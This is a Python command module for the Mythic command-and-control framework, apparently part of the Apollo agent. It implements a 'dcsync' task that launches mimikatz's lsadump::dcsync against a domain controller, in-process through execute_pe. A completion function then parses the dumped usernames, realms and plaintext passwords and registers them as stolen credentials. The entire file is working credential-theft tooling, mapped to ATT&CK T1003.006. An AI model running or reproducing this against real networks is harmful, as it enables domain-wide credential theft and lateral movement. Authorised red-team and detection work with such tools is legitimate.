from mythic_container.MythicCommandBase import *
from os import path
from mythic_container.MythicRPC import *
import mslex
from .execute_pe import *


class DcSyncArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="domain",
                cli_name="Domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Domain to sync credentials from.",
                parameter_group_info=[ParameterGroupInfo(ui_position=1, required=True)],
            ),
            CommandParameter(
                name="user",
                cli_name="User",
                display_name="User",
                default_value="all",
                type=ParameterType.String,
                description="Username to sync. Defaults to all.",
                parameter_group_info=[
                    ParameterGroupInfo(ui_position=2, required=False)
                ],
            ),
            CommandParameter(
                name="dc",
                cli_name="DC",
                display_name="DC",
                type=ParameterType.String,
                description="Domain controller to sync credential material from.",
                parameter_group_info=[
                    ParameterGroupInfo(ui_position=3, required=False)
                ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)

            arguments = "/domain:{}".format(self.get_arg("domain"))

            if self.get_arg("dc"):
                arguments += " /dc:{}".format(self.get_arg("dc"))
            if self.get_arg("user") != "all":
                arguments += " /user:{}".format(self.get_arg("user"))
            else:
                arguments += " /all"

            self.add_arg("arguments", arguments)
        else:
            raise Exception(
                "No mimikatz command given to execute.\n\tUsage: {}".format(
                    DcSyncCommand.help_cmd
                )
            )


async def parse_credentials_dcsync(
    task: PTTaskCompletionFunctionMessage,
) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(
        Success=True, TaskStatus="success", Completed=True
    )
    responses = await SendMythicRPCResponseSearch(
        MythicRPCResponseSearchMessage(TaskID=task.TaskData.Task.ID)
    )
    for output in responses.Responses:
        mimikatz_out = str(output.Response)
        comment = "task {}".format(output.TaskID)
        if mimikatz_out != "":
            lines = mimikatz_out.split("\r\n")

            for i in range(len(lines)):
                line = lines[i]
                if "Username" in line:
                    # Check to see if Password is null
                    if i + 2 >= len(lines):
                        break
                    uname = line.split(" : ")[1].strip()
                    realm = lines[i + 1].split(" : ")[1].strip()
                    passwd = lines[i + 2].split(" : ")[1].strip()
                    if passwd != "(null)":
                        cred_resp = await MythicRPC().execute(
                            "create_credential",
                            task_id=task.TaskData.Task.ID,
                            credential_type="plaintext",
                            account=uname,
                            realm=realm,
                            credential=passwd,
                            comment=comment,
                        )
                        if cred_resp.status != MythicStatus.Success:
                            raise Exception("Failed to register credential")
    return response


class DcSyncCommand(CommandBase):
    cmd = "dcsync"
    attributes = CommandAttributes(dependencies=["execute_pe"], alias=True)
    needs_admin = False
    help_cmd = "dcsync -Domain [domain] -User [user]"
    description = "Sync a user's Kerberos keys to the local machine."
    version = 4
    author = "@djhohnstein"
    argument_class = DcSyncArguments
    attackmapping = ["T1003.006"]
    script_only = False
    completion_functions = {"parse_credentials_dcsync": parse_credentials_dcsync}

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:

        arguments = taskData.args.get_arg("arguments")

        arguments = "lsadump::dcsync " + arguments
        executePEArgs = ExecutePEArguments(command_line=json.dumps({
            "pe_name": "mimikatz.exe",
            "pe_arguments": mslex.quote(arguments, for_cmd = False),
        }))
        await executePEArgs.parse_arguments()
        executePECommand = ExecutePECommand(agent_path=self.agent_code_path,
                                            agent_code_path=self.agent_code_path,
                                            agent_browserscript_path=self.agent_browserscript_path)
        # set our taskData args to be the new ones for execute_pe
        taskData.args = executePEArgs
        # executePE's creat_go_tasking function returns a response for us
        newResp = await executePECommand.create_go_tasking(taskData=taskData)
        # update the response to make sure this gets pulled down as execute_pe instead of mimikatz
        newResp.CommandName = "execute_pe"
        newResp.DisplayParams = arguments
        newResp.CompletionFunctionName = "parse_credentials_dcsync"
        return newResp

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
